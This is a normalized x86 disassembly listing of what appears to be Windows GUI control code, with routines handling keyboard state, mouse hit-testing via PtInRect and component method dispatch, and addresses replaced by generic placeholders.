mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_455fa0
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403324
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_44c640
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403324
jmp r-xdata
sub_435fbc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_4085c8
mov edi eax
mov eax [ esi + 0x64 ]
call sub_4085f4
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_434754
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408420
call sub_4083bc
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_4083bc
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_436064
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_436094
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_436058
push ebp
call sub_436064
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4360e4
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_436170
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_4361a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_435c28
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44c5b0
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403324
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44c5b0
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403324
sub_43622c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_434724
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_434dec
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_4361a8
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_436278
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_434724
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_436294
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_434724
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_434dec
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4361a8
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403324
sub_4362ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_435bc8
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_435b5c
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_435bc8
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_436388
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4361a8
pop esi
pop ebx
retn
sub_4363ad
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4361a8
pop esi
pop ebx
retn
sub_4363d3
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4361a8
pop esi
pop ebx
retn
sub_4363fd
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4361a8
pop esi
pop ebx
retn
sub_436428
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_436458
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_435c28
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44c5b0
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403324
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44c5b0
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403324
sub_4364d0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_436508
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44c5b0
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403324
sub_436540
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_434dec
mov edx edi
xor ecx ecx
mov eax ebx
call sub_436508
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406878
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403324
sub_4365b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_436508
pop esi
pop ebx
retn
sub_4365d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_436508
pop esi
pop ebx
retn
sub_4365f8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_44c5b0
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403324
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_43fd08
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_436650
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_434ddc
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_434dec
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_435d5c
pop esi
retn
sub_436690
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_435d90
sub_43673e
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_434ffc
mov cl 0x1
sub_436780
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_434d54
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_434d54
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_4367b0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_4367d4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406878
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403324
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_435d5c
mov [ ebx + 0xc ] eax
sub_436878
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_434ca8
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_434ca8
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_43690c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_403070
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_434348
mov edx [ esp ]
mov eax esi
call sub_434324
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_4345d0
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_434614
sub_436990
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_41245c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_4346cc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_4124ac
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_434574
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436a1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43690c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_43b390
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_436990
pop ecx
jmp r-xdata
sub_436a7c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_436b6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436b71
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_434be4
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_434bb4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_434bb4
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404284
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403ecc
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_434ad4
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_436b78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403324
sub_436ba4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436bc4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436be4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436c04
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436c24
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436c44
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436c64
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4196c0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_434208
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403324
sub_436c9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436d38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413f58
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_4414f8
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_441630
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_434bb4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_441390
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_441750
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436d3f
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_436d48
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_436d84
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_436d48
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_436e34
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4032b4
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_436e68
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_436e88
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov eax edi
call sub_436ec8
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_436ef4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_436f20
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406878
mov eax esp
call sub_4124d4
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4346f8
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403324
